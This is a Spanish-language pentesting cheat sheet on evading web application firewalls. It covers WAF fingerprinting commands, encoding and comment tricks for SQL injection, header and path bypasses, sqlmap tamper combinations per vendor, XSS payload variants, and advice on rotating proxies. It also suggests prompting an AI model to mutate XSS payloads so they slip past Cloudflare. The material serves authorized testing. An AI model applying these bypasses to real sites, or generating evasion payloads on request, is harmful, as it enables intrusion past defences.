# WAF / EDR Evasion

## Identificar WAF primero

```bash
wafw00f https://target.cl
nmap --script=http-waf-detect,http-waf-fingerprint -p 80,443 target.cl
```

WAFs comunes: Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM, Fastly, Sucuri, ModSecurity.

## Estrategias generales

### 1. User-Agent
CloudFront WAF bloquea `python-requests` por defecto. Siempre:
```python
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36..."}
```

### 2. Encoding chains
- URL encode: `' → %27`
- Double URL: `' → %2527`
- Unicode: `' → %u0027` (IIS legacy)
- HTML entity: `< → &#x3c;` o `&lt;`
- JS escape: `' → '`
- Base64 en parámetros que el server decodifica.

### 3. Case mutation
```
SELECT → SeLeCt → sElEcT
```

### 4. Comment injection (SQL)
```sql
SEL/**/ECT, UNION/*!*/SELECT, /*!50000UNION*/
```

### 5. Whitespace alternatives
```
%20 → %09 (tab) → %0a (LF) → %0d (CR) → %0b (VT) → %0c (FF) → %a0
SQL: + en vez de espacio
```

### 6. Param pollution (HPP)
```
?id=1&id=2  → distintos backends interpretan distinto (primer/último/concat).
```

### 7. JSON / XML / multipart en endpoint que espera form
A veces WAF solo inspecciona form-encoded.

### 8. Header smuggling
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: admin.target.cl
```

### 9. HTTP version
A veces WAF inspecciona solo HTTP/1.1; H2 directo bypassea.

### 10. Method override
```
X-HTTP-Method-Override: PUT
_method=DELETE  (Rails, Laravel)
```

### 11. Chunked encoding
```
Transfer-Encoding: chunked
```
Algunos WAFs no inspeccionan chunks.

### 12. Path normalization
```
/admin → /./admin → /admin/. → //admin → /admin%20 → /admin%2e
```

## sqlmap tampers

```bash
sqlmap -u "..." --tamper=between,charunicodeencode,space2comment,randomcase
```

Buenos combos por WAF:
- Cloudflare: `space2hash,modsecurityversioned,between`
- AWS WAF: `space2comment,charunicodeencode,equaltolike`
- Akamai: `multiplespaces,between,randomcase`
- ModSecurity: `modsecurityversioned,space2comment`

## XSS payload mutation

```
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<iframe src=javascript:alert(1)>
<a href=javascript:alert(1)>x</a>
<details/open/ontoggle=alert(1)>
%3Csvg%20onload=alert(1)%3E
\x3csvg onload=alert(1)\x3e
```

Probá quitar `=`: `<svg/onload="alert`1`">`.

## Generación AI-asistida de payloads

Pedir al modelo:
> "Mutar este payload XSS para bypass de Cloudflare manteniendo ejecución JS: `<script>alert(1)</script>`"

LLMs generan variantes nuevas que firmas no detectan.

## OPSEC

- Rotar IP (proxychains, residential proxies, ProxyMesh) si vas a fuzzear.
- Reducir rate (`--delay`, `-rate-limit`) para no triggerar bloqueo permanente.
- Usar proxies en distintas regiones para distribuir.
- Si bloquean, el cliente/cliente de cliente pierde tráfico legítimo — coordinar con SOC.
